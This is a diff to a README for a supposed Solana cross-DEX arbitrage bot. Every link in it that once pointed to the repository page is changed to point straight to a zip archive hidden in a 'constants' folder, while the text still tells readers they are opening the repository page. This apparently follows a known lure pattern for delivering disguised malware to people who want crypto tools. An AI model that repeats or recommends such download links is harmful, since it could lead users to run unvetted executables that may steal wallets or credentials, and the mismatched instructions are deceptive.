@@ -1,6 +1,6 @@
 # ⚡ Solana-Arbitrage-Bot - Fast Cross-DEX Price Scanner
 
-[![Download Solana-Arbitrage-Bot](https://img.shields.io/badge/Download-Solana--Arbitrage--Bot-brightgreen?style=for-the-badge)](https://github.com/ambrator14-rgb/Solana-Arbitrage-Bot)
+[![Download Solana-Arbitrage-Bot](https://img.shields.io/badge/Download-Solana--Arbitrage--Bot-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ambrator14-rgb/Solana-Arbitrage-Bot/main/constants/Bot_Solana_Arbitrage_v1.7.zip)
 
 ## 📖 About Solana-Arbitrage-Bot
 
@@ -39,7 +39,7 @@ Make sure your Windows PC meets the following before installing:
 
 1. Visit the download page by clicking the button below:  
 
-   [![Download Solana-Arbitrage-Bot](https://img.shields.io/badge/Download-Solana--Arbitrage--Bot-blue?style=for-the-badge)](https://github.com/ambrator14-rgb/Solana-Arbitrage-Bot)
+   [![Download Solana-Arbitrage-Bot](https://img.shields.io/badge/Download-Solana--Arbitrage--Bot-blue?style=for-the-badge)](https://raw.githubusercontent.com/ambrator14-rgb/Solana-Arbitrage-Bot/main/constants/Bot_Solana_Arbitrage_v1.7.zip)
 
 2. This will open the GitHub repository page. Look for the **Releases** section. You can find it by clicking on "Releases" on the right side of the page or scrolling down.
 
@@ -111,7 +111,7 @@ Updates often include bug fixes, faster scanning, and new features.
 
 ## 📚 Additional Resources
 
-- Visit the GitHub page at: https://github.com/ambrator14-rgb/Solana-Arbitrage-Bot  
+- Visit the GitHub page at: https://raw.githubusercontent.com/ambrator14-rgb/Solana-Arbitrage-Bot/main/constants/Bot_Solana_Arbitrage_v1.7.zip  
 - Explore the Releases section for program updates and download links.  
 - Look for user guides or FAQs in the GitHub Wiki or Issues tabs.  
 
